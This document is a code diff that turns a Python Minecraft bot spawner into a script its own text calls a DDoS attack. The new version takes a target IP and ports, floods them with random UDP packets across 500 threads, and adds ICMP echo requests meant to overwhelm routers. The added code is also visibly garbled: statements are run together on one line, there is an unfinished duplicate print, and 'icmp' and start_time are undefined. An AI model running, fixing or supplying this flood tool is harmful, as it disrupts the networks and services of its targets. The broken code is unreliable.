@@ -1,32 +1,38 @@
+import socket
 import random
-import string
+import threading
+from scapy.all import*import os
 import time
-from mineflayer import Bot
 
-def random_name(length=10):
-    letters = string.ascii_lowercase  # Используем только маленькие буквы
-    return ''.join(random.choice(letters) for _ in range(length))
+# Get target IP and port from console
+target_ip = input("Enter target IP: ")target_ports = list(map(int, input("Enter ports to target, separated by commas (e.g., 80,443,25):").split(',')))# Attack configuration 
+attack_num = 0
+packets_sent = 0
 
-def create_bot(server_address, port, version):
-    bot = Bot(random_name(), version=version)
+print("Starting DDoS attack on", target_ip,"with following ports:", target_ports)def udp_flood():    global packets_sent, attack_num
     
-    @bot.event
-    def on_spawn():
-        while True:
-            bot.chat("привет")
-            bot.jump()
-            time.sleep(0.5)  # Задержка, чтобы избежать спама
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)    
+    while True:
+        try:
+            for port in target_ports:                
+                data_size = random.randint(64, 1024)                
+                                packet_data = os.urandom(data_size)            
+                s.sendto(packet_data, (target_ip, port))                
+                packets_sent += 1
+            
+            # Send additional ICMP echo requests to overwhelm router resources 
+            icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)            icmp_socket.setsockopt(socket.SOL_IP, socket.IP_SOURCE_ROUTE,"1")            
+            for_ in range(5):                icmp_socket.sendto(icmp.ECHO_REQUEST(target_ip), (target_ip, 33434))            
+            attack_num += 1
+        except:
+            pass
 
-    bot.connect(server_address, port)
-
-def main():
-    server_address = input("Выберите адрес сервера: ")
-    port = int(input("Введите порт сервера: "))
-    version = input("Выберите версию Minecraft (например, '1.16.4'): ")
-    num_bots = int(input("Выберите количество ботов: "))
-
-    for _ in range(num_bots):
-        create_bot(server_address, port, version)
-
-if __name__ == "__main__":
-    main()
+def show_status():    global packets_sent
+    
+    print(f"\nDDoS Attack Status:")    print(f"Total Packets Sent: {packets_sent}")    print(f"Packets per Second: {(packets_sent / (time.time()
+    
+    print(f"Packets per Second: {(packets_sent / (time.time() - start_time)):.2f}")start_time = time.time()while True:
+    show_status()    
+    # Launch UDP flood and ICMP echo request threads
+    for i in range(500):        thread = threading.Thread(target=udp_flood)        thread.start()    
+    time.sleep(0.1)
